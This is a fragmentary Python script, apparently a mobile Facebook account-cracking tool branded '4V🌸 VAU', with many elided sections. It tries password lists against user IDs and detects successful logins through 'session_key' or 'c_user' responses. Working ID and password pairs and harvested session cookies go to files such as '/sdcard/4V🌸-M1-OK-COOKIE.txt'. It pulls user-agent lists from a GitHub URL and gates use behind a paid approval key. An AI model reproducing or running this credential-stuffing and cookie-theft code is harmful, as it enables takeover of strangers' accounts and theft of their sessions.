...
{g}\n{h} MAKE BY  {I}{a} 4V🌸 VAU
{h} FACEBOOK {I}{a} 4V🌸 VAU
...
def maxpro1():
      ...
      return ua
#━━━━━━━━[ MOTO_Z_(10) for ind. ]━━━━━━━━#
resrr = requests.get('https://raw.githubusercontent.com/prantovau55🌸-143/R/main/mix.txt').text
...
def approval():
     ...
     key=kns+'|'+ak[:20]
     url=f"https://github.com/X4JU/BEST/blob/main/PAID"
        ...
        try:
             for pak in pasx:
                    ...
                    if 'session_key' in po:
                           ...
                           print(f"\r\r{a}↳{w}[{a}4V🌸-💙{w}] {a}{uid} {I} {pwx}")
                           open("/sdcard/4V🌸-M1-OK-COOKIE.txt","a").write(uid+'|'+pwx+'|'+str(coki)+'\n')
                           oks.append(uid)
                           break
                    elif 'www.facebook.com' in po['error']['message']:
                            uid = str(ids)
                            pwx = str(pas)
                            open('/sdcard/4V🌸-M1-CP.txt','a').write(uid+'|'+pwx+'\n')
                            cps.append(uid)
                            break
                    else:
                            continue
        ...
        try:
             for pak in pasx:
                    ...
                    if 'session_key' in po:
                           ...
                           coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                           print(f"\r\r{a}↳{w}[{a}4V🌸-💙{w}] {a}{uid} {I} {pwx}")
                           open("/sdcard/4V🌸-M2-OK-COOKIE.txt","a").write(uid+'|'+pwx+'|'+str(coki)+'\n')
                           oks.append(uid)
                           break
                    elif 'www.facebook.com' in po['error']['message']:
                            uid = str(ids)
                            pwx = str(pas)
                            open('/sdcard/4V🌸-M2-CP.txt','a').write(uid+'|'+pwx+'\n')
                            cps.append(uid)
                            break
                    else:
                            continue
...
def idpaslogin(uid,passlist,tl):
        global loop,oks
        sys.stdout.write(f"\r\r{a}↳{w}[{a}4V🌸-XD{w}]{a}-{w}[{a}{loop}{w}|{a}{tl}{w}]{a}-{w}[{a}OK:{str(len(oks))}{w}] ");sys.stdout.flush()
        try:
            for ps in passlist:
                    ...
                    if 'c_user' in log_cookies:
                           ...
                           if 'Photoshop' in res:
                                 print(f"\r\r{a}↳{w}[{a}4V🌸-💙{w}] {a}{uid} {I} {ps}")
